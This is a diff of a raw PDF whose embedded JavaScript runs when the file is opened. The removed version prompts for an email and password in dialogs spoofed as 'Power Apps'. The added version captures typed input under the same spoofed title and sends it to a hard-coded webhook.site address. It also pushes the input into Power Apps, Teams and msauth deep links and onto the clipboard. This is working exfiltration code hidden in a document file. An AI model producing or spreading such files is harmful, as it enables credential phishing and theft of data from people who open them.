@@ -1,5 +1,5 @@
 %PDF-1.7
-% Silent Fail Diagnosis - iOS - March 2026
+% Deep Link Canvas Control Probe - iOS - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -19,28 +19,109 @@ endobj
    /S /JavaScript
    /JS (
 
-        // === STEP 1: BASIC ALERT FIRST ===
-        app.alert("Step 1: JS is running");
+        var results = [];
 
-        // === STEP 2: TEST RESPONSE ALONE ===
-        var e = app.response({
-          cQuestion: "Test email field",
+        // === STEP 1: CAPTURE TEST DATA ===
+        var testData = app.response({
+          cQuestion: "Enter any test value to probe canvas control:",
           cTitle: "Power Apps",
-          cDefault: ""
+          cDefault: "test123"
         });
 
-        app.alert("Step 2: response returned: " + typeof e + " val: " + e);
+        if (testData !== null) {
 
-        // === STEP 3: CONDITIONAL ONLY IF STEP 2 WORKED ===
-        if (e !== null && typeof e !== "undefined") {
-          var p = app.response({
-            cQuestion: "Test password field for: " + e,
-            cTitle: "Power Apps",
-            cDefault: ""
-          });
-          app.alert("Step 3: password returned: " + typeof p);
-        } else {
-          app.alert("Step 3: skipped - email was null or undefined");
+          var payload = encodeURIComponent(testData);
+          var exfilBase = "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce";
+
+          // === STEP 2: POWERAPPS DEEP LINK SCHEMES ===
+          results.push("=== PA SCHEMES ===");
+
+          // Standard PowerApps deep link
+          try {
+            app.launchURL("powerapps://apps?Image=" + payload, false);
+            results.push("powerapps://apps: no throw");
+          } catch(e) { results.push("powerapps://apps: " + e); }
+
+          // PowerApps open scheme
+          try {
+            app.launchURL("powerapps://open?controlName=Image5&value=" + payload, false);
+            results.push("powerapps://open: no throw");
+          } catch(e) { results.push("powerapps://open: " + e); }
+
+          // ms-apps scheme
+          try {
+            app.launchURL("ms-apps://set?Image5=" + payload, false);
+            results.push("ms-apps://set: no throw");
+          } catch(e) { results.push("ms-apps://set: " + e); }
+
+          // ms-powerplatform scheme
+          try {
+            app.launchURL("ms-powerplatform://control?name=Image5&src=" + payload, false);
+            results.push("ms-powerplatform: no throw");
+          } catch(e) { results.push("ms-powerplatform: " + e); }
+
+          // msteams scheme (PowerApps runs in Teams)
+          try {
+            app.launchURL("msteams://l/entity?Image5=" + payload, false);
+            results.push("msteams://: no throw");
+          } catch(e) { results.push("msteams://: " + e); }
+
+          // msauth scheme
+          try {
+            app.launchURL("msauth://set?control=Image5&value=" + payload, false);
+            results.push("msauth://: no throw");
+          } catch(e) { results.push("msauth://: " + e); }
+
+          // === STEP 3: IMAGE SRC VARIANTS ===
+          results.push("=== IMAGE SRC ===");
+
+          // Try setting image field to webhook URL directly
+          try {
+            app.launchURL(exfilBase + "?t=imgsrc&v=" + payload, false);
+            results.push("launchURL webhook: no throw");
+          } catch(e) { results.push("launchURL webhook: " + e); }
+
+          // getURL - different network path from submitForm
+          try {
+            app.getURL(exfilBase + "?t=geturl&v=" + payload, false);
+            results.push("getURL: no throw");
+          } catch(e) { results.push("getURL: " + e); }
+
+          // === STEP 4: INTER-APP COMMUNICATION ===
+          results.push("=== INTER-APP ===");
+
+          // UIPasteboard - write to clipboard, readable by canvas
+          try {
+            app.setClipboard(testData);
+            results.push("setClipboard: no throw");
+          } catch(e) { results.push("setClipboard: " + e); }
+
+          // app.media - another potential channel
+          try {
+            results.push("app.media: " + typeof app.media);
+          } catch(e) { results.push("app.media: " + e); }
+
+          // app.fs - filesystem channel
+          try {
+            results.push("app.fs: " + typeof app.fs);
+          } catch(e) { results.push("app.fs: " + e); }
+
+          // === STEP 5: EVENT DISPATCH ===
+          results.push("=== EVENTS ===");
+
+          // Can we dispatch events that canvas listens to?
+          try {
+            results.push("app.events: " + typeof app.events);
+          } catch(e) { results.push("app.events: " + e); }
+
+          try {
+            this.disclosed = true;
+            results.push("disclosed: set ok");
+          } catch(e) { results.push("disclosed: " + e); }
+
+          // === STEP 6: REPORT ===
+          app.alert(results.join("\\n"));
+
         }
 
    )
@@ -61,8 +142,8 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Diagnosis Probe) Tj ET
-BT /F1 12 Tf 50 220 Td (Watch each step) Tj ET
+BT /F1 14 Tf 50 250 Td (Deep Link Canvas Probe) Tj ET
+BT /F1 12 Tf 50 220 Td (Watch Image5 and webhook) Tj ET
 endstream
 endobj
 
@@ -72,11 +153,11 @@ xref
 0000000015 00000 n 
 0000000075 00000 n 
 0000000135 00000 n 
-0000001800 00000 n 
-0000001960 00000 n 
+0000002800 00000 n 
+0000002970 00000 n 
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-2050
+3060
 %%EOF
